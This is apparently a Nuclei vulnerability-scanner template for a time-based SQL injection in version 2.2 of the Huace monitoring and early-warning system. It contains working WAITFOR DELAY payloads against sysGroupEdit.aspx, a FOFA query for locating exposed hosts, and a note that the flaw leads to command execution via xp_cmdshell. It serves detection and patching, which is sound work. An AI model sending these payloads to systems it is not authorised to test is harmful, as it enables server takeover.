http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /Web/SysManage/sysGroupEdit.aspx?&ID=1';WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
        - |
          GET /Web/SysManage/sysGroupEdit.aspx?&ID=1';WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
id: huace-sysGroupEdit_aspx-sql
info:
    author: Superhero
    description: |-
        fofa: icon_hash="-628229493"
        华测监测预警系统2.2 sysGroupEdit.aspx 接口处存在SQL注入漏洞，未经身份验证的远程攻击者可利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
    name: 华测监测预警系统2.2 sysGroupEdit.aspx SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/7oPUQt9q3lYJMO3tykxM0Q
    severity: high
    tags:
        - 华测监测预警系统
